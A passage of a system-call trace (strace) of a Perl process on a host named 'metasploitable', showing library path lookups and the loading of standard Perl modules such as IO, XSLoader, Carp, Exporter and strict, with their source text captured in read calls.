\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
5498  07:09:19.801219 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
5498  07:09:19.801236 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dae000
5498  07:09:19.801246 mmap2(0xb7db7000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7db7000
5498  07:09:19.801260 mmap2(0xb7db9000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7db9000
5498  07:09:19.801273 close(1)          = 0
5498  07:09:19.801296 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dad000
5498  07:09:19.801309 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dad8c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
5498  07:09:19.801365 mprotect(0xb7f29000, 4096, PROT_READ) = 0
5498  07:09:19.801390 munmap(0xb7f71000, 29913) = 0
5498  07:09:19.801403 set_tid_address(0xb7dad908) = 5498
5498  07:09:19.801412 set_robust_list(0xb7dad910, 0xc) = 0
5498  07:09:19.801430 futex(0xbf9c2e60, 0x81 /* FUTEX_??? */, 1) = 0
5498  07:09:19.801447 rt_sigaction(SIGRTMIN, {0xb7f332c0, [], SA_SIGINFO}, NULL, 8) = 0
5498  07:09:19.801489 rt_sigaction(SIGRT_1, {0xb7f33340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
5498  07:09:19.801535 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
5498  07:09:19.801548 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
5498  07:09:19.801566 uname({sys="Linux", node="metasploitable", ...}) = 0
5498  07:09:19.801611 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
5498  07:09:19.801656 brk(0)            = 0x8153000
5498  07:09:19.801665 brk(0x8174000)    = 0x8174000
5498  07:09:19.801709 getuid32()        = 0
5498  07:09:19.801719 geteuid32()       = 0
5498  07:09:19.801728 getgid32()        = 0
5498  07:09:19.801737 getegid32()       = 0
5498  07:09:19.801772 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d8c000
5498  07:09:19.801797 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
5498  07:09:19.801813 read(1, "\207\277\306\310", 4) = 4
5498  07:09:19.801826 close(1)          = 0
5498  07:09:19.801844 time(NULL)        = 1495624159
5498  07:09:19.801884 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbf9c2b30) = -1 ENOENT (No such file or directory)
5498  07:09:19.801901 stat64("/usr/local/lib/site_perl/5.8.8", 0xbf9c2b30) = -1 ENOENT (No such file or directory)
5498  07:09:19.801914 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbf9c2b30) = -1 ENOENT (No such file or directory)
5498  07:09:19.801963 stat64("/usr/local/lib/perl/5.8.7", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.801976 stat64("/usr/local/share/perl/5.8.7", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802005 stat64("/usr/local/lib/perl/5.8.6", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802020 stat64("/usr/local/share/perl/5.8.6", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802032 stat64("/usr/local/lib/perl/5.8.4", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802043 stat64("/usr/local/share/perl/5.8.4", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802055 stat64("/usr/local/lib/perl/5.8.3", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802066 stat64("/usr/local/share/perl/5.8.3", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802077 stat64("/usr/local/lib/perl/5.8.2", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802089 stat64("/usr/local/share/perl/5.8.2", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802100 stat64("/usr/local/lib/perl/5.8.1", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802112 stat64("/usr/local/share/perl/5.8.1", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802123 stat64("/usr/local/lib/perl/5.8.0", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802134 stat64("/usr/local/share/perl/5.8.0", 0xbf9c2c70) = -1 ENOENT (No such file or directory)
5498  07:09:19.802157 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2968) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.802170 _llseek(0, 0, [0], SEEK_CUR) = 0
5498  07:09:19.802181 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2968) = -1 EBADF (Bad file descriptor)
5498  07:09:19.802192 _llseek(1, 0, 0xbf9c29b0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
5498  07:09:19.802202 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2968) = -1 EINVAL (Invalid argument)
5498  07:09:19.802213 _llseek(2, 0, 0xbf9c29b0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5498  07:09:19.802223 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
5498  07:09:19.802235 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2a28) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.802245 _llseek(1, 0, [0], SEEK_CUR) = 0
5498  07:09:19.802256 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
5498  07:09:19.802267 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
5498  07:09:19.802285 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
5498  07:09:19.802336 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
5498  07:09:19.802379 getppid()         = 5496
5498  07:09:19.802475 stat64("/etc/perl/IO.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802505 stat64("/etc/perl/IO.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802519 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802531 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802545 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802557 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802584 stat64("/usr/lib/perl5/IO.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802596 stat64("/usr/lib/perl5/IO.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802608 stat64("/usr/share/perl5/IO.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802620 stat64("/usr/share/perl5/IO.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802632 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802645 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
5498  07:09:19.802665 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 10
5498  07:09:19.802679 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2438) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.802690 _llseek(10, 0, [0], SEEK_CUR) = 0
5498  07:09:19.802715 read(10, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
5498  07:09:19.802778 stat64("/etc/perl/XSLoader.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802792 stat64("/etc/perl/XSLoader.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802805 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802817 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802831 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802843 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802857 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802868 stat64("/usr/lib/perl5/XSLoader.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802881 stat64("/usr/share/perl5/XSLoader.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802893 stat64("/usr/share/perl5/XSLoader.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802906 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.802927 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
5498  07:09:19.802974 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.803005 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.803033 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.803051 read(11, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
5498  07:09:19.803281 brk(0x8195000)    = 0x8195000
5498  07:09:19.803658 _llseek(11, 3407, [3407], SEEK_SET) = 0
5498  07:09:19.803676 _llseek(11, 0, [3407], SEEK_CUR) = 0
5498  07:09:19.803686 close(11)         = 0
5498  07:09:19.803731 stat64("/etc/perl/Carp.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803746 stat64("/etc/perl/Carp.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803759 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803771 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803785 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803797 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803810 stat64("/usr/lib/perl5/Carp.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803822 stat64("/usr/lib/perl5/Carp.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803835 stat64("/usr/share/perl5/Carp.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803846 stat64("/usr/share/perl5/Carp.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803859 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803871 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803884 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.803897 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
5498  07:09:19.803929 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.803985 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.804011 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.804045 read(11, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
5498  07:09:19.804597 read(11, "gmess  @_ }\n\n1;\n", 4096) = 16
5498  07:09:19.804626 read(11, "", 4096) = 0
5498  07:09:19.804638 close(11)         = 0
5498  07:09:19.804673 stat64("/etc/perl/Exporter.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804687 stat64("/etc/perl/Exporter.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804704 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804716 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804730 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804742 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804756 stat64("/usr/lib/perl5/Exporter.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804768 stat64("/usr/lib/perl5/Exporter.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804781 stat64("/usr/share/perl5/Exporter.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804792 stat64("/usr/share/perl5/Exporter.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804806 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804818 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804831 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.804843 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
5498  07:09:19.804864 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.804878 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.804889 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.804906 read(11, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
5498  07:09:19.805414 _llseek(11, 2217, [2217], SEEK_SET) = 0
5498  07:09:19.805430 _llseek(11, 0, [2217], SEEK_CUR) = 0
5498  07:09:19.805440 close(11)         = 0
5498  07:09:19.805585 stat64("/etc/perl/strict.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805619 stat64("/etc/perl/strict.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805633 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805646 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805659 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805671 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805685 stat64("/usr/lib/perl5/strict.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805697 stat64("/usr/lib/perl5/strict.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805710 stat64("/usr/share/perl5/strict.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805721 stat64("/usr/share/perl5/strict.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805734 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805747 stat64("/usr/lib/perl/5.8/strict.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805760 stat64("/usr/share/perl/5.8/strict.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.805773 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
5498  07:09:19.805793 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.805808 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.805819 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.805838 read(11, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
5498  07:09:19.805974 _llseek(11, 598, [598], SEEK_SET) = 0
5498  07:09:19.806037 _llseek(11, 0, [598], SEEK_CUR) = 0
5498  07:09:19.806048 close(11)         = 0
5498  07:09:19.806121 stat64("/etc/perl/warnings.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806155 stat64("/etc/perl/warnings.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806169 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806198 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
